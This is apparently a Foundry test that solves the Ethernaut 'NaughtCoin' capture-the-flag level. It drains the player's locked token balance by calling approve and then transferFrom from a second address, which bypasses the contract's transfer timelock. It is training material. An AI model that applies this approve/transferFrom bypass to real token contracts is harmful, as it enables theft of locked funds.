// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {BaseTest} from "./BaseTest.t.sol";
import {NaughtCoinFactory} from "../src/NaughtCoin/NaughtCoinFactory.sol";
import {NaughtCoin} from "../src/NaughtCoin/NaughtCoin.sol";

contract NaughtCoinTest is BaseTest {
    address public anotherPlayer = makeAddr("anotherPlayer");

    function testNaughtCoinHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        NaughtCoinFactory factory = new NaughtCoinFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        ////////////////////*/
        //    Level Attack
        ////////////////////*/
        uint256 balance = ethernautNaughtCoin.balanceOf(player);
        ethernautNaughtCoin.approve(anotherPlayer, balance);
        vm.stopPrank();
        vm.prank(anotherPlayer);
        ethernautNaughtCoin.transferFrom(player, anotherPlayer, balance);
        assertEq(ethernautNaughtCoin.balanceOf(anotherPlayer), balance);
        assertEq(ethernautNaughtCoin.balanceOf(player), 0);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        vm.prank(player);
        bool levelCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
